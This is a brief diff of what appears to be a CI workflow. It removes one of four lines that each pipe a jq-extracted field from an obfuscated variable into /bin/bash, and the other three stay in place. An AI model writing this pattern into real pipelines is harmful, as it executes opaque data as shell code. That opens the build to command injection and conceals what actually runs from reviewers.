@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$tv2537" | jq -r .vm6115 | /bin/bash
           echo $wf9 | jq -r .dajen634 | /bin/bash
           printf '%s' "$f78" | jq -r .ffk4 | /bin/bash
-          echo $bat91084 | jq -r .hflc66 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
